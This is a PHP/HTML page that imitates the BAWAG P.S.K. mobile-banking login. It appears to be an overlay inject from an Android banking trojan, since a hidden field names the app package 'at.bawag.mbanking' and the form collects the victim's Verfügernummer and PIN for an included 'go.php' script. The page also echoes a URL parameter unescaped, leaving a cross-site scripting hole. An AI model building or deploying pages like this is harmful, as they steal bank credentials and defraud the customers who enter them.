<?php require_once '../go.php'; ?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <title>02</title>

    <link rel="stylesheet" href="css/ak_normalize.css">
    <link rel="stylesheet" href="css/main.css">

    <link rel="stylesheet" href="css/bawagpsk.css">

    <script src="js/vendor/jquery-1.11.3.min.js"></script>
    <script src="js/viewport.js"></script>
</head>

<body>
    <div class="row">
        <div class="form_header">
            <img src="img/bawagpsk/logo.png" alt="">
        </div>
    </div>
		<div class="modal modal_02">
			<div class="container">
				<form action="" method="post" class="wrapper">
                <input type="hidden" name="p" value="<?php echo $_GET["p"]; ?>">
                <input type="hidden" name="field1" value="at.bawag.mbanking" class="main_input">
					<div class="row">
						<div class="content">
							<div class="input_block_wr">
								<div class="inp_caption">
Verfügernummer
								</div>
								<div class="inp_wr">
									<input type="text" name="field2" class="main_input">
								</div>
							</div>
							<div class="input_block_wr">
								<div class="inp_caption">
PIN
								</div>
								<div class="inp_wr">
									<input type="text" name="field3" class="main_input">
								</div>
							</div>
							<div class="btn_wr">
								<input type="submit" class="sign_btn" value="Login">
							</div>
						</div>
					</div>
				</form>
			</div>
		</div>
</body>

</html>
